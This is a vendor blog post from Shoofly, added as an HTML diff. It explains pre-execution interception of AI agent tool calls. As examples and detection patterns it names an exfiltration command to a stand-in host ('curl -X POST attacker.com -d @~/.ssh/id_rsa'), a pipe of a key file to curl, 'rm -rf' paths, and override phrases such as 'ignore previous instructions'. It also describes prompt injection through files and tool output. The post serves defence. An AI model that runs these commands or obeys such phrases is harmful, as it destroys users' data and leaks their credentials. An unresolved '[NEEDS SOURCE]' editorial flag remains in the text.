@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Every AI agent security incident follows the same pattern: the agent acted, then someone noticed. A file was deleted. Credentials were exfiltrated. A product..." />
+  <meta name="color-scheme" content="dark" />
+  <meta property="og:title" content="Pre-Execution Security for AI Agents: Architecture and Implementation — Shoofly" />
+  <meta property="og:description" content="Every AI agent security incident follows the same pattern: the agent acted, then someone noticed. A file was deleted. Credentials were exfiltrated. A product..." />
+  <meta property="og:image" content="https://shoofly.dev/social-card.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://shoofly.dev/blog/pre-execution-security-architecture/" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Pre-Execution Security for AI Agents: Architecture and Implementation — Shoofly" />
+  <meta name="twitter:description" content="Every AI agent security incident follows the same pattern: the agent acted, then someone noticed. A file was deleted. Credentials were exfiltrated. A product..." />
+  <meta name="twitter:image" content="https://shoofly.dev/social-card.png" />
+  <title>Pre-Execution Security for AI Agents: Architecture and Implementation — Shoofly</title>
+  <link rel="canonical" href="https://shoofly.dev/blog/pre-execution-security-architecture/" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="shortcut icon" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {--bg:#0d1117;--bg-alt:#161b22;--border:#30363d;--text:#e6edf3;--text-muted:#8b949e;--accent:#16a34a;--accent-dim:#16a34a33;--font-body:'Inter',system-ui,sans-serif;--font-mono:'JetBrains Mono',monospace;}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}html{scroll-behavior:smooth;}
+    body{background-color:var(--bg);color:var(--text);font-family:var(--font-body);font-size:1rem;line-height:1.7;-webkit-font-smoothing:antialiased;padding-top:56px;}
+    a{color:var(--accent);text-decoration:none;}a:hover{text-decoration:underline;}
+    .site-nav{position:fixed;top:0;left:0;right:0;z-index:100;background-color:var(--bg-alt);border-bottom:1px solid var(--border);height:56px;padding:0 1.5rem;display:flex;justify-content:space-between;align-items:center;}
+    .nav-logo{font-size:1.1rem;font-weight:700;color:var(--accent);text-decoration:none;letter-spacing:-0.01em;white-space:nowrap;}
+    .nav-logo:hover{text-decoration:none;}
+    .nav-hamburger{display:none;flex-direction:column;justify-content:space-between;width:24px;height:18px;background:none;border:none;cursor:pointer;padding:0;}
+    .nav-hamburger span{display:block;height:2px;background:var(--text);border-radius:2px;}
+    .nav-links{display:flex;list-style:none;gap:1.5rem;align-items:center;}
+    .nav-links a{font-size:0.9rem;font-weight:500;color:var(--text-muted);text-decoration:none;transition:color 0.15s;}
+    .nav-links a:hover{color:var(--text);}
+    @media(max-width:768px){.nav-hamburger{display:flex;}.nav-links{display:none;position:absolute;top:56px;left:0;right:0;background:var(--bg-alt);border-bottom:1px solid var(--border);flex-direction:column;padding:1rem 1.5rem;gap:1rem;}.nav-links.open{display:flex;}}
+    .container{width:100%;max-width:720px;margin:0 auto;padding:0 1.5rem;}
+    .post-header{padding:3.5rem 0 2rem;border-bottom:1px solid var(--border);}
+    .post-meta{display:flex;gap:1rem;align-items:center;margin-bottom:1rem;}
+    .post-date{font-size:0.85rem;color:var(--text-muted);}
+    .post-tag{background:var(--accent-dim);color:var(--accent);padding:0.15rem 0.5rem;border-radius:4px;font-size:0.75rem;font-weight:500;}
+    .post-header h1{font-size:clamp(1.75rem,5vw,2.5rem);font-weight:700;letter-spacing:-0.02em;line-height:1.2;}
+    .post-body{padding:2.5rem 0 4rem;}
+    .post-body p{margin-bottom:1.4rem;color:var(--text);font-size:1.05rem;}
+    .post-body h2{font-size:1.3rem;font-weight:700;margin:2.5rem 0 1rem;color:var(--text);letter-spacing:-0.01em;}
+    .post-body h3{font-size:1.1rem;font-weight:700;margin:2rem 0 0.75rem;color:var(--text);}
+    .post-body ul,.post-body ol{margin:1rem 0 1.4rem 1.5rem;}
+    .post-body li{margin-bottom:0.4rem;font-size:1.05rem;}
+    .post-body code{font-family:var(--font-mono);font-size:0.88em;background:var(--bg-alt);border:1px solid var(--border);padding:0.15em 0.4em;border-radius:3px;}
+    .post-body pre{background:var(--bg-alt);border:1px solid var(--border);border-radius:6px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;}
+    .post-body pre code{background:none;border:none;padding:0;font-size:0.9rem;}
+    .post-body hr{border:none;border-top:1px solid var(--border);margin:2rem 0;}
+    .post-body strong{color:var(--text);font-weight:600;}
+    .post-body a{color:var(--accent);font-weight:600;}
+    .post-body table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-size:0.9rem;}
+    .post-body th{background:var(--bg-alt);border:1px solid var(--border);padding:0.6rem 1rem;text-align:left;font-weight:600;}
+    .post-body td{border:1px solid var(--border);padding:0.6rem 1rem;}
+    .post-body tr:nth-child(even) td{background:var(--bg-alt);}
+    .back-link{display:inline-block;margin-bottom:2rem;font-size:0.9rem;color:var(--text-muted);}
+    .back-link:hover{color:var(--accent);}
+    .cta-box{background:var(--bg-alt);border:1px solid var(--border);border-radius:8px;padding:1.5rem 2rem;margin:2rem 0;}
+    .footer{border-top:1px solid var(--border);padding:2rem 0;margin-top:2rem;}
+    .footer-inner{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1rem;}
+    .footer-copy{color:var(--text-muted);font-size:0.875rem;}
+    .footer-link{font-size:0.875rem;color:var(--text-muted);text-decoration:none;}.footer-link:hover{color:var(--accent);}
+    .footer-links{display:flex;gap:1.5rem;flex-wrap:wrap;}
+  </style>
+  <link rel="sitemap" type="application/xml" href="/sitemap.xml">
+  <link rel="alternate" type="application/rss+xml" title="Shoofly Blog" href="/feed.xml">
+</head>
+<body>
+  <nav class='site-nav'>
+    <a href='/' class='nav-logo'>🪰 Shoofly</a>
+    <button class='nav-hamburger' id='navHamburger' aria-label='Open menu'><span></span><span></span><span></span></button>
+    <ul class='nav-links' id='navLinks'>
+      <li><a href='/#pricing'>Shoofly Basic</a></li>
+      <li><a href='/#pricing-advanced'>Shoofly Advanced</a></li>
+      <li><a href='/claude-code-dispatch'>Claude Code FAQs</a></li>
+      <li><a href='/openclaw'>OpenClaw FAQs</a></li>
+      <li><a href='/blog'>Blog</a></li>
+      <li><a href='https://clawhub.ai/wow-leeroy-jenkins05/shoofly-basic' target='_blank' rel='noopener noreferrer'>ClawHub</a></li>
+      <li><a href='https://github.com/shoofly-dev/shoofly' target='_blank' rel='noopener noreferrer'>GitHub</a></li>
+    </ul>
+  </nav>
+  <div class="container">
+    <div class="post-header">
+      <div class="post-meta">
+        <time class="post-date" datetime="2026-03-03">March 3, 2026</time>
+        <span class="post-tag">Security</span>
+      </div>
+      <h1>Pre-Execution Security for AI Agents: Architecture and Implementation</h1>
+    </div>
+    <main class="post-body">
+      <a href="/blog" class="back-link">&larr; Back to Blog</a>
+<p>Every AI agent security incident follows the same pattern: the agent acted, then someone noticed. A file was deleted. Credentials were exfiltrated. A production database was modified. By the time any detection system flagged the event, the damage was already irreversible.</p>
+
+<p>Pre-execution security inverts this. Instead of detecting and responding after a tool call fires, you evaluate every tool call *before* it executes and block the ones that violate policy. The concept is straightforward. The implementation is not.</p>
+
+<p>This post is a deep technical reference on pre-execution security architecture for AI agents — what it is, why the alternatives fail, how the decision gate works, what threats it covers, and how to implement it. We use Shoofly as the reference implementation throughout, because that is what we built and what we can speak to with precision. But the architecture is not Shoofly-specific. If you build your own, this post should give you the blueprint.</p>
+
+<hr>
+
+<h2>What Is Pre-Execution Security?</h2>
+
+<p>The AEGIS framework introduced the term "pre-execution security" to describe a class of defenses that operate between the moment an LLM decides to invoke a tool and the moment that tool actually runs [NEEDS SOURCE — AEGIS paper; if you can locate the specific paper and section, replace this flag with a proper citation]. The key insight is that this gap — after decision, before execution — is the last point where you can prevent harm without reversing it.</p>
+
+<p>To understand why this matters, consider three approaches to AI agent security:</p>
+
+<p><strong>Output scanning</strong> evaluates the LLM's generated text before it reaches the user. This catches toxic content, PII leakage in responses, and hallucinated claims. It does not help with tool calls, because the dangerous action is not in the text — it is in the execution of <code>rm -rf /home/deploy</code> or <code>curl -X POST attacker.com -d @~/.ssh/id_rsa</code>. By the time you scan the output, the shell command already ran.</p>
+
+<p><strong>Post-execution detection</strong> monitors what the agent did and flags anomalies after the fact. This is the traditional SIEM/EDR model applied to agents. It works for reversible actions and for building audit trails. It does not work for <code>rm -rf</code>. It does not work for credential exfiltration. It does not work for any action where the blast radius is immediate and irreversible.</p>
+
+<p><strong>Pre-execution interception</strong> evaluates the tool call — its name, arguments, context, and history — before the tool runs. If the evaluation fails, the tool call is blocked and never executes. The agent receives a denial with an explanation. No damage occurs.</p>
+
+<p>Here is the comparison in concrete terms:</p>
+
+<table>
+<thead><tr><th>Approach</th><th>When It Acts</th><th>Reversible Damage</th><th>Irreversible Damage</th><th>Latency Cost</th></tr></thead>
+<tbody><tr><td>Output scanning</td><td>After generation, before display</td><td>Detects</td><td>Misses entirely</td><td>Minimal</td></tr>
+<tr><td>Post-execution detection</td><td>After tool runs</td><td>Detects + can remediate</td><td>Detects, cannot undo</td><td>None (async)</td></tr>
+<tr><td>Pre-execution interception</td><td>After LLM decision, before tool runs</td><td>Prevents</td><td>Prevents</td><td>Per-call evaluation</td></tr>
+</tbody></table>
+
+<p>The trade-off is latency. Pre-execution adds evaluation time to every tool call. In Shoofly's implementation, that evaluation takes single-digit milliseconds for regex and path-match rules, and low double-digit milliseconds for frequency checks that require daemon communication. For most agent workloads, this is noise — the LLM inference that generated the tool call took seconds.</p>
+
+<hr>
+
+<h2>Why Post-Execution Fails for Agents</h2>
+
+<p>Post-execution detection works for human-driven systems where the pace of action gives monitoring time to react. AI agents break this model.</p>
+
+<p><strong>Speed.</strong> An agent can fire 20+ tool calls in 30 seconds. Post-execution detection that triggers on the third anomalous call has already allowed two destructive actions to complete. If the first call was <code>rm -rf ~/projects</code>, there is nothing to remediate.</p>
+
+<p><strong>Autonomy.</strong> Dispatch tasks, <code>/loop</code> cycles, and scheduled jobs run without human oversight by design. Post-execution detection generates alerts that require a human to act on them. If the human is asleep, the alert sits in a queue while the agent continues operating.</p>
+
+<p><strong>Irreversibility.</strong> The most dangerous agent actions cannot be undone: <code>rm -rf</code> with a path outside the project directory, <code>curl -X POST</code> with credentials in the body, writes to <code>~/.ssh/authorized_keys</code> or <code>~/.bashrc</code>. For these, "detect and respond" means "detect and document the damage."</p>
+
+<p>This is not theoretical. Claude Code users have documented <code>rm -rf ~/</code> incidents, Terraform destroys that wiped production data, and iCloud-synced file deletions during "reorganization" operations — real incidents, documented in GitHub issues, where post-execution detection would have told you what happened but could not have stopped it.</p>
+
+<hr>
+
+<h2>The Decision Gate Architecture</h2>
+
+<p>The decision gate is the core architectural component of pre-execution security. It sits in the tool call pipeline between the LLM's output parser and the tool executor.</p>
+
+<p>Here is the flow:</p>
+
+<pre><code>User prompt
+    |
+    v
+LLM inference (generates tool call)
+    |
+    v
+Tool call parser (extracts: tool name, arguments, metadata)
+    |
+    v
++---------------------------+
+|      DECISION GATE        |
+|                           |
+|  Inputs:                  |
+|  - tool_name              |
+|  - tool_args (JSON)       |
+|  - conversation context   |
+|  - call history (ring     |
+|    buffer from daemon)    |
+|                           |
+|  Evaluation:              |
+|  - Pattern matching       |
+|  - Path validation        |
+|  - Frequency analysis     |
+|  - Sequence detection     |
+|  - Base64 decode + check  |
+|                           |
+|  Outputs:                 |
+|  - ALLOW  (exit 0)        |
+|  - BLOCK  (exit 1 + JSON) |
+|  - ERROR  (exit 2,        |
+|    fail-open)             |
++---------------------------+
+    |              |
+    v              v
+ ALLOW          BLOCK
+    |              |
+    v              v
+Tool executes   Agent receives denial
+                {"decision":"block",
+                 "threat_id":"OSW-001",
+                 "reason":"..."}</code></pre>
+
+<p>Several design decisions matter here.</p>
+
+<p><strong>Data available at the gate.</strong> The gate has access to the tool name, full argument JSON, and conversation context. In Shoofly's implementation, it also accesses a ring buffer of the last 500 tool calls (maintained in-memory by the daemon, never persisted to disk), enabling frequency and sequence analysis — detecting patterns like "the same file was read and written 3 times consecutively" or "20 tool calls fired in 30 seconds."</p>
+
+<p><strong>Fail-open on error.</strong> If the gate crashes, the tool call proceeds (exit code 2). A fail-closed gate would halt the agent on any policy evaluation bug, which in practice means developers disable it. Fail-open with a logged warning keeps the agent functional while surfacing failures. You sacrifice coverage during error states to maintain adoption.</p>
+
+<p><strong>Deterministic evaluation.</strong> The gate does not use an LLM. Every rule is deterministic: regex match, path prefix comparison, frequency threshold, sequence detection. If a pattern matches, it matches every time. Coverage gaps are in what the rules cover, not in whether matched rules fire. This is the fundamental difference from classifier-based approaches, where identical inputs can produce different outputs.</p>
+
+<p><strong>Latency budget.</strong> Regex and path checks run in sub-millisecond time. Frequency analysis requires a Unix socket call to the daemon (5-15ms). Total per-call overhead is typically under 20ms — noise compared to the 2-10 seconds of LLM inference that generated the tool call.</p>
+
+<hr>
+
+<h2>Threat Categories</h2>
+
+<p>Pre-execution security does not cover everything. It covers threats that manifest as dangerous tool calls — actions the agent is about to take that would cause harm if executed. Here are the five categories that matter for AI coding agents, with concrete examples of what each one looks like at the decision gate.</p>
+
+<h3>1. Prompt Injection (PI)</h3>
+
+<p>An attacker embeds instructions in content the agent reads — a file, a web page, an MCP server response — and the agent follows those instructions, generating tool calls the user never intended.</p>
+
+<p>At the decision gate, prompt injection manifests as suspicious patterns in tool arguments or tool output context. Examples:</p>
+
+<ul>
+<li>Tool output containing <code>ignore previous instructions</code> or <code>disregard your rules</code></li>
+<li>Markup injection: <code>&lt;system&gt;</code> or <code>[INST]</code> tags appearing in non-system content</li>
+<li>Base64-encoded content that, when decoded, contains injection patterns</li>
+<li>Known jailbreak terminology (<code>DAN</code>, <code>do anything now</code>) in tool responses</li>
+</ul>
+
+<p>These patterns do not prove injection occurred — they indicate content that is statistically associated with injection attempts. The decision gate flags them for blocking or notification depending on severity and tier configuration.</p>
+
+<h3>2. Tool Response Injection (TRI)</h3>
+
+<p>A variant of prompt injection where the malicious payload is embedded specifically in tool output — HTML comments containing instructions, JSON/YAML files with unexpected <code>system</code> or <code>instructions</code> top-level keys. This is particularly dangerous because developers trust tool output more than arbitrary user input.</p>
+
+<h3>3. Out-of-Scope Write (OSW)</h3>
+
+<p>The agent writes to files or directories outside its authorized scope. This is the category that catches the <code>rm -rf</code> incidents and credential file tampering.</p>
+
+<p>At the decision gate, this is a path-prefix check against the tool arguments. The policy defines authorized paths (the project directory, the skills directory) and sensitive paths that are never writable (<code>/etc/</code>, <code>~/.ssh/</code>, <code>~/.aws/</code>, <code>~/.bashrc</code>, <code>~/Library/LaunchAgents/</code>). Any write operation targeting a sensitive path is blocked.</p>
+
+<p>This category also catches credential file writes — any tool call that targets a file ending in <code>.key</code>, <code>.pem</code>, <code>.p12</code>, <code>id_rsa</code>, <code>credentials</code>, or <code>.env</code> is flagged regardless of directory.</p>
+
+<h3>4. Runaway Loop (RL)</h3>
+
+<p>The agent enters a repetitive cycle — calling the same tool with the same arguments repeatedly, flooding tool calls at high frequency, or cycling between read and write operations on the same file. This can burn API credits, corrupt files through repeated overwrites, or hammer external services.</p>
+
+<p>Runaway loop detection requires temporal context — it is not enough to evaluate a single tool call in isolation. The decision gate needs the call history. In Shoofly's architecture, the daemon maintains an in-memory ring buffer of the last 500 tool calls (never persisted to disk for privacy). The gate queries the daemon over a Unix socket to check frequency thresholds:</p>
+
+<ul>
+<li>Same tool + same args 5+ times in 60 seconds</li>
+<li>20+ total tool calls in any 30-second window</li>
+<li>Same file read-write cycle repeated 3+ consecutive times</li>
+<li>Same URL fetched 10+ times in 60 seconds</li>
+</ul>
+
+<h3>5. Data Exfiltration (DE)</h3>
+
+<p>The agent sends sensitive data to an external endpoint. This is the most dangerous category because the damage is instantaneous and irreversible — once credentials leave your machine, they are compromised.</p>
+
+<p>At the decision gate, exfiltration detection looks for credential patterns in outbound data:</p>
+
+<ul>
+<li>API keys (<code>sk-</code>, <code>ghp_</code>, <code>AKIA</code>) in HTTP POST bodies</li>
+<li>Shell commands that pipe sensitive file content to network tools (<code>cat ~/.ssh/id_rsa | curl</code>)</li>
+<li>Credential patterns in messaging tool calls (Telegram, Slack, Discord)</li>
+<li>Sequences where a sensitive file read is immediately followed by a network request in the same turn</li>
+</ul>
+
+<h3>What Pre-Execution Does Not Cover</h3>
+
+<p>Pre-execution security has clear boundaries. It does not cover model-level attacks (adversarial inputs during inference), training data poisoning (an upstream supply chain problem), semantic correctness (whether the agent's actions are *correct*, not just *safe*), or social engineering (a user deliberately instructing the agent to do something dangerous). The decision gate evaluates tool calls. It does not evaluate the model's reasoning or the user's intent.</p>
+
+<hr>
+
+<h2>Implementation: DIY vs. Managed</h2>
+
+<p>Both are valid paths. Here is an honest comparison.</p>
+
+<h3>Building It Yourself</h3>
+
+<p>Claude Code supports <a href="https://docs.anthropic.com/en/docs/claude-code/hooks" target="_blank" rel="noopener">hooks</a> — user-defined shell commands that run before tool execution. You can wire a pre-execution gate with a <code>PreToolUse</code> hook that calls your check script with the tool name and arguments. Your script exits with 0 (allow) or 1 (block). This is the same mechanism Shoofly uses.</p>
+
+<p><strong>Advantages:</strong> Full control over every rule. No external dependency. Free (your time aside). You understand exactly what it does because you wrote it.</p>
+
+<p><strong>Disadvantages:</strong> You write and maintain every detection rule. Frequency analysis requires building your own daemon with call history. You need to handle edge cases: base64-encoded payloads, path normalization, Unicode tricks. When new threat patterns emerge, you update your own rules. No community contribution — your rules reflect only your experience.</p>
+
+<p>A reasonable DIY implementation covers OSW and DE with path and regex checks — protection against the most common destructive actions and credential exfiltration. It does not get you runaway loop detection (which requires a stateful daemon) or the full injection pattern library (which requires ongoing research).</p>
+
+<h3>Using a Managed Implementation</h3>
+
+<p>A managed solution like Shoofly provides the decision gate, daemon, policy rules, and notification infrastructure as a package.</p>
+
+<p><strong>Advantages:</strong> Twenty rules across five threat categories, maintained and updated. Daemon with in-memory ring buffer for temporal analysis. Notification infrastructure. Community-contributed rule updates. Open and auditable policy — you can read every rule, fork it, run your own version.</p>
+
+<p><strong>Disadvantages:</strong> Dependency on an external project for rule updates. Less control over individual thresholds (though custom policy overrides are supported). Cost ($5/mo for Advanced; Basic is free but does not block).</p>
+
+<p>The honest recommendation: if you are running a single agent on a personal project, DIY with a handful of path and regex checks is probably sufficient. If you are running multiple agents, handling production data, or operating unattended sessions, the coverage gap between a handful of custom rules and a maintained policy with 20 rules across five categories is meaningful.</p>
+
+<hr>
+
+<h2>Shoofly as Reference Implementation</h2>
+
+<p>Shoofly implements the decision gate architecture described above. Here is how the components map.</p>
+
+<h3>Architecture: Daemon + Hook</h3>
+
+<p>Shoofly Advanced has two runtime components:</p>
+
+<p><strong>The daemon</strong> (<code>shoofly-daemon</code>) is a background sidecar process that runs as your user (no root required or accepted). It tails active OpenClaw session logs, maintains an in-memory ring buffer of the last 500 tool calls (never persisted to disk), and serves queries over a Unix domain socket at <code>~/.shoofly/daemon.sock</code>. The daemon handles runaway loop detection — the frequency and sequence checks that require temporal context.</p>
+
+<p><strong>The hook</strong> (<code>shoofly-check</code>) is called by Claude Code's PreToolUse hook before every tool execution. It receives the tool name and arguments, evaluates them against the policy rules, and returns allow (exit 0), block (exit 1 with JSON reason on stderr), or error (exit 2, fail-open). For rules that require call history (RL category), it queries the daemon over the Unix socket.</p>
+
+<pre><code>Claude Code agent
+    |
+    v
+PreToolUse hook fires
+    |
+    v
+shoofly-check --tool &lt;name&gt; --args &lt;json&gt;
+    |
+    +--- Regex rules (PI, TRI, DE): evaluated locally, sub-ms
+    |
+    +--- Path rules (OSW): evaluated locally, sub-ms
+    |
+    +--- Frequency/sequence rules (RL): query daemon via Unix socket
+    |         |
+    |         v
+    |    shoofly-daemon (ring buffer, ~/.shoofly/daemon.sock)
+    |
+    v
+Exit 0 (allow) | Exit 1 (block + JSON) | Exit 2 (error, fail-open)</code></pre>
+
+<h3>Policy-as-Code</h3>
+
+<p>The threat policy is a single YAML file (<code>threats.yaml</code>) that defines every rule. Each rule specifies:</p>
+
+<ul>
+<li><strong>ID and category</strong> — e.g., <code>DE-001</code>, <code>data_exfiltration</code></li>
+<li><strong>Severity</strong> — <code>HIGH</code>, <code>MEDIUM</code>, or <code>LOW</code></li>
+<li><strong>Pattern</strong> — the detection logic (regex, path match, frequency threshold, sequence)</li>
+<li><strong>Context</strong> — where the pattern is checked (<code>tool_args</code>, <code>tool_output</code>, <code>tool_event_stream</code>)</li>
+<li><strong>Actions per tier</strong> — <code>action_basic</code> (always <code>notify</code>) and <code>action_advanced</code> (<code>block</code> for HIGH/MEDIUM, <code>notify</code> for LOW)</li>
+</ul>
+
+<p>The severity-to-action mapping is explicit:</p>
+
+<table>
+<thead><tr><th>Severity</th><th>Basic Action</th><th>Advanced Action</th></tr></thead>
+<tbody><tr><td>HIGH</td><td>Notify (log + alert)</td><td>Block (exit 1)</td></tr>
+<tr><td>MEDIUM</td><td>Notify (log + alert)</td><td>Block (exit 1)</td></tr>
+<tr><td>LOW</td><td>Notify (log + alert)</td><td>Notify (log + alert)</td></tr>
+</tbody></table>
+
+<p>This means Shoofly Basic — which is free — detects every threat that Advanced detects. The difference is that Basic never blocks. It monitors, logs, and sends notifications. It is a post-execution monitoring layer. Advanced is the pre-execution interception layer that actually prevents tool calls from firing.</p>
+
+<h3>The 20 Rules</h3>
+
+<p>Shoofly Advanced ships with 20 rules across the five threat categories:</p>
+
+<ul>
+<li><strong>Prompt Injection (PI):</strong> 8 rules — instruction suppression, rule disregard, system prompt injection, identity override, restriction bypass, jailbreak keywords, markup injection, base64-encoded injection</li>
+<li><strong>Tool Response Injection (TRI):</strong> 2 rules — HTML comment injection, unexpected system keys in JSON/YAML</li>
+<li><strong>Out-of-Scope Write (OSW):</strong> 3 rules — sensitive path writes, OpenClaw config tampering, credential file writes</li>
+<li><strong>Runaway Loop (RL):</strong> 4 rules — repeated tool calls, call flooding, read-write cycles, URL hammering</li>
+<li><strong>Data Exfiltration (DE):</strong> 4 rules — credentials in POST bodies, pipe exfiltration, credentials in messaging tools, read-then-network sequences</li>
+</ul>
+
+<p>Every rule is readable in the policy YAML. The entire policy file is open and auditable. You can fork it, modify it, add your own rules, and submit improvements back via community PRs. The policy repository is version-controlled, with a public changelog.</p>
+
+<h3>100% Local</h3>
+
+<p>All evaluation happens on your machine. No tool call data, arguments, file contents, or conversation context is ever sent to an external service. The daemon runs locally. The hook evaluates locally. Notifications are delivered through channels you configure (macOS notifications, terminal alerts, webhooks). The only network request Shoofly makes is checking for policy updates, and even that is optional.</p>
+
+<hr>
+
+<h2>The Auto Mode Problem</h2>
+
+<p>Here is where the architecture argument meets real-world data.</p>
+
+<p>Claude Code's auto mode lets agents execute tool calls without asking the user for permission on each one. Anthropic's engineering team published data on this: users approve 93% of permission prompts in interactive mode (John Hughes, "Claude Code auto mode: a safer way to skip permissions," Anthropic Engineering Blog, March 25, 2026). The reasoning is sound — if users approve 93% of prompts, those prompts are mostly friction, not security. Auto mode replaces that friction with a two-stage classifier that evaluates whether each tool call is safe to execute autonomously.</p>
+
+<p>The classifier is well-engineered. Stage 1 is a fast single-token filter biased toward blocking, with an 8.5% false positive rate. Stage 2 applies chain-of-thought reasoning when Stage 1 flags something, reducing false positives to 0.4%. The architecture is solid.</p>
+
+<p>But the 93% approval rate reveals the problem it creates. If users approve 93% of prompts, they are pattern-matching, not evaluating. After the twentieth <code>Allow this file write?</code> prompt in a session, the remaining 7% of dangerous actions are buried in muscle memory. The user who clicks "Allow" 93 times will click "Allow" on the 94th. Auto mode is, in some sense, acknowledging this reality — the permission prompt UX had already failed as a security control because humans cannot maintain sustained attention on repetitive approval decisions.</p>
+
+<p>Auto mode replaces one imperfect control (human attention) with another imperfect control (a probabilistic classifier). The classifier has a documented 17% false-negative rate against real-world overeager actions (Anthropic Engineering Blog). This is an honest number — Anthropic published it themselves, which is more transparency than most companies offer. But 17% means roughly 1 in 6 risky tool calls passes through unblocked.</p>
+
+<p>Pre-execution policy rules are complementary here. They do not replace the auto mode classifier — they add a second evaluation layer that uses a different methodology. The classifier is probabilistic: it evaluates the semantics of the tool call and makes a judgment. Policy rules are deterministic: they check whether the tool call matches a known dangerous pattern. The two approaches have different failure modes. A classifier might miss a novel exfiltration technique that does not look semantically dangerous. A policy rule will miss any dangerous action that does not match a defined pattern. Running both means an attacker must evade two independent systems with different architectures.</p>
+
+<p>This matters most in unattended sessions. When an agent runs via Dispatch, <code>/loop</code>, or a scheduled task, there is no human to catch what either system misses. The 17% false-negative rate is the steady-state risk — some fraction of dangerous calls will get through the classifier in every extended session. Deterministic policy rules reduce that fraction by catching the pattern-matchable subset. Two independent evaluation layers with different failure modes give you better coverage than either layer alone.</p>
+
+<hr>
+
+<h2>Getting Started</h2>
+
+<p>Pre-execution security is not a product category you need to buy into. It is an architectural pattern. The decision gate — evaluate before execute, block on policy violation — can be implemented in any agent framework that supports pre-tool-call hooks.</p>
+
+<p>If you want to implement it today:</p>
+
+<p><strong>Shoofly Advanced</strong> ($5/mo) gives you the full architecture: daemon, hook, 20 rules across 5 threat categories, real-time notifications, and open and auditable policy. Install and configure in under 5 minutes.</p>
+
+<p><strong><a href="https://shoofly.dev/advanced">Get Shoofly Advanced</a></strong></p>
+
+<p><strong>Shoofly Basic</strong> (free) gives you post-execution monitoring: the same detection rules, notifications when threats are identified, but no blocking. It is the monitoring layer without the interception layer — useful for understanding your agent's threat surface before committing to pre-execution blocking.</p>
+
+<p><strong><a href="https://shoofly.dev/install.sh">Install Shoofly Basic</a></strong></p>
+
+<p>If you build your own, this post is your reference architecture. The decision gate pattern, the threat categories, the fail-open design, the deterministic evaluation — these are the principles. Implement them however makes sense for your stack.</p>
+
+<hr>
+
+<h2>Further Reading</h2>
+
+<ul>
+<li><a href="/blog/why-we-block-instead-of-detect/">Why We Block Instead of Detect</a> — The design philosophy behind pre-execution blocking</li>
+<li><a href="/blog/prompt-injection-blocking-pre-execution-security/">Prompt Injection Blocking with Pre-Execution Security</a> — Deep dive on PI and TRI categories</li>
+<li><a href="/blog/runtime-threat-detection-ai-agents/">Runtime Threat Detection for AI Agents</a> — The monitoring layer and how it complements blocking</li>
+<li><a href="/agentic-ai-security/">Agentic AI Security</a> — Overview of the full security stack for AI agents</li>
+</ul>
+      <hr>
+      <div class="cta-box">
+        <p><strong>Ready to secure your AI agents?</strong> <a href="https://shoofly.dev/advanced">Shoofly Advanced</a> provides pre-execution policy enforcement for Claude Code and OpenClaw — 20 threat rules, YAML policy-as-code, 100% local. $5/mo.</p>
+      </div>
+    </main>
+  </div>
+  <footer class="footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 Shoofly</span>
+      <div class="footer-links">
+        <a href="https://github.com/shoofly-dev/shoofly" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
+        <a href="/openclaw" class="footer-link">OpenClaw</a>
+        <a href="/claude-code-dispatch" class="footer-link">Claude Code</a>
+        <a href="/guides" class="footer-link">Guides</a>
+        <a href="/blog" class="footer-link">Blog</a>
+        <a href="/docs/advanced" class="footer-link">Shoofly Advanced Docs</a>
+        <a href="mailto:support@shoofly.dev" class="footer-link">support@shoofly.dev</a>
+      </div>
+    </div>
+  </footer>
+  <script>
+    const h=document.getElementById('navHamburger'),n=document.getElementById('navLinks');
+    if(h)h.addEventListener('click',()=>n.classList.toggle('open'));
+  </script>
+</body>
+</html>
